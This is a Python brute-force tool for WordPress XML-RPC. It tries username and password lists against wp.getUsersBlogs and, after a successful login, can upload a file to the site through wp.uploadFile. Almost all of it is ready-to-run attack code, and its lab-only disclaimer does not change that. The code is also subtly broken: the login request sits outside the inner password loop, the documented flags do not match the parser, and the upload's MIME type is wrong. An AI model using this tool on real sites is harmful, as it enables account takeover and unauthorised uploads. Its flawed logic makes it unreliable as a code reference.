"""
WordPress XML-RPC Brute-Force Tool 
----------------------------------------------------

Description:
This script is designed to simulate a brute-force attack on WordPress XML-RPC
(`wp.getUsersBlogs`) in a controlled lab environment. It reads usernames and
passwords from files and attempts authentication via XML-RPC.

Usage:
    python3 wp_xmlrpc_bruteforce.py -u http://target.com/xmlrpc.php -U users.txt -P passwords.txt

Arguments:
    -d : URL to the target WordPress XML-RPC (e.g., http://localhost/wordpress/xmlrpc.php)
    -U : File containing usernames (one per line)
    -u : Valid username
    -P : File containing passwords (one per line)
    -p : Valid password
    --upload : Upload test file after successful login

Author: VeryLazyTech
Site: https://www.verylazytech.com

Note:
- For educational and lab purposes only.
- Ensure you have permission to test any target site.
- If packages are missing, the script will suggest installing them with pip.
"""

# ===== FUNCTION TO ESCAPE XML-RPC SPECIAL CHARACTERS =====
def escape_xmlrpc(value):
    return value.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


def upload_file(xmlrpc_url, user, password, file_path):
    """
    Upload a file via XML-RPC to WordPress.
    
    Args:
        xmlrpc_url (str): Full URL to xmlrpc.php.
        user (str): WordPress username.
        password (str): WordPress password.
        file_path (str): Path to the file to upload.
    """
    if not os.path.isfile(file_path):
        print(Fore.RED + f"[FAIL] File not found: {file_path}, uploading a dummy file called 'dummy.jpg'")
        dummy_file = True
        file_path = "dummy.jpg"
        # Create a small dummy file
        with open(file_path, "wb") as f:
            f.write(b"This is a dummy file for upload testing.")
        
    # Extract file name
    filename = os.path.basename(file_path)
    
    # Determine MIME type (optional: default application/octet-stream)
    mime_type = "application/octet-stream"
    if filename.lower().endswith(".jpg") or filename.lower().endswith(".jpeg"):
        mime_type = "image/jpeg"
    elif filename.lower().endswith(".png"):
        mime_type = "image/png"
    elif filename.lower().endswith(".gif"):
        mime_type = "image/gif"
    else:
        print(Fore.RED + "File type not supported change it to .png...")
        base_name, old_extension = os.path.splitext(filename)
        filename = base_name + ".png"
        mime_type = "image/gif"
    
    # Read file and encode in base64
    with open(file_path, "rb") as f:
        file_data = f.read()
    base64_data = base64.b64encode(file_data).decode("utf-8")
    
    
    payload = f"""<?xml version='1.0'?>
<methodCall>
  <methodName>wp.uploadFile</methodName>
  <params>
    <param><value><string>1</string></value></param>
    <param><value><string>{user}</string></value></param>
    <param><value><string>{password}</string></value></param>
    <param>
      <value>
        <struct>
          <member>
            <name>name</name>
            <value><string>{filename}</string></value>
          </member>
          <member>
            <name>type</name>
            <value><string>{mime_type}</string></value>
          </member>
          <member>
            <name>bits</name>
            <value><base64><![CDATA[{base64_data}]]></base64></value>
          </member>
        </struct>
      </value>
    </param>
  </params>
</methodCall>
"""
    headers = {"Content-Type": "text/xml"}
    response = requests.post(xmlrpc_url, data=payload.encode("utf-8"), headers=headers)

    # Decode bytes to string
    resp_text = response.content.decode("utf-8")

    # Parse XML response
    try:
        root = ET.fromstring(resp_text)
        url = root.find(".//member[name='url']/value/string")
        if url is not None:
            print("\033[32m[SUCCESS] File uploaded successfully!\033[0m")
            print(f"Uploaded file URL: {url.text}")
        else:
            print("\033[31m[FAIL] Upload failed or URL not found.\033[0m")
    except ET.ParseError:
        print("\033[31m[FAIL] Invalid XML response received.\033[0m")


# Example usage with argparse
if __name__ == "__main__":
    import argparse
    import sys
    from colorama import init, Fore
    import requests
    import argparse
    import xml.etree.ElementTree as ET
    import os
    import base64
    
    init(autoreset=True)

    required_packages = ["requests", "colorama", "argparse", "os", "base64"]
    missing_packages = []

    for pkg in required_packages:
        try:
            __import__(pkg)
        except ImportError:
            missing_packages.append(pkg)

    if missing_packages:
        print(f"Missing packages: {', '.join(missing_packages)}")
        print("Install them with this command:")
        print(f"pip install {' '.join(missing_packages)}")
        sys.exit(1)

    print(Fore.YELLOW +r"""
     _                   __  __          _ ____             
    | |    __ _ _____   _\ \/ /_ __ ___ | |  _ \ _ __   ___ 
    | |   / _` |_  / | | |\  /| '_ ` _ \| | |_) | '_ \ / __|
    | |__| (_| |/ /| |_| |/  \| | | | | | |  _ <| |_) | (__ 
    |_____\__,_/___|\__, /_/\_\_| |_| |_|_|_| \_\ .__/ \___|
                    |___/                       |_|         
                      @VeryLazyTech""")

    
    # ===== ARGUMENT PARSER =====
    parser = argparse.ArgumentParser(description="WordPress XML-RPC brute & optional file upload")
    parser.add_argument("-x", "--url", required=True, help="WordPress xmlrpc.php URL")  # changed -u to -x
    parser.add_argument("-U", "--users", help="Users file")
    parser.add_argument("-u", "--username", help="Valid username")
    parser.add_argument("-P", "--passwords", help="Passwords file")
    parser.add_argument("-p", "--password", help="Valid password")
    parser.add_argument("--upload", help="Upload test file after successful login")
    args = parser.parse_args()

    xmlrpc_url = args.url

    # ===== LOAD USERS AND PASSWORDS =====
    users = []
    passwords = []

    if args.users:
        print(Fore.GREEN + "Loading usernames from file...")
        with open(args.users, "r") as f:
            users = [line.strip() for line in f.readlines()]
    elif args.username:
        print(Fore.GREEN + f"Using single username: {args.username}")
        users = [args.username]
    else:
        print(Fore.RED + "Missing argument -u or -U")
        exit(1)

    if args.passwords:
        print(Fore.GREEN + "Loading passwords from file...")
        with open(args.passwords, "r") as f:
            passwords = [line.strip() for line in f.readlines()]
    elif args.password:
        print(Fore.GREEN + f"Using single password: {args.password}")
        passwords = [args.password]
    else:
        print(Fore.RED + "Missing argument -p or -P")
        exit(1)

    # ===== BRUTE-FORCE LOOP =====
    headers = {"Content-Type": "text/xml"}
    print(Fore.GREEN + f"Starting brute-force. Now's your time to be laZy...")
    for user in users:
        for password in passwords:
            user_esc = escape_xmlrpc(user)
            password_esc = escape_xmlrpc(password)

        payload = f"""<?xml version="1.0"?>
    <methodCall>
      <methodName>wp.getUsersBlogs</methodName>
      <params>
        <param><value><string>{user_esc}</string></value></param>
        <param><value><string>{password_esc}</string></value></param>
      </params>
    </methodCall>
    """
        response = requests.post(xmlrpc_url, data=payload.encode("utf-8"), headers=headers)

        if b"<methodResponse>" in response.content and b"faultCode" not in response.content:
            print(Fore.GREEN + f"[SUCCESS] {user}:{password}")
            succses_user = user_esc
            succses_password = password_esc
            if args.upload:
                upload_file(xmlrpc_url, succses_user, succses_password, file_path=args.upload)
        else:
            print(Fore.RED + f"[FAIL] {user}:{password}", end='\r', flush=True)
        
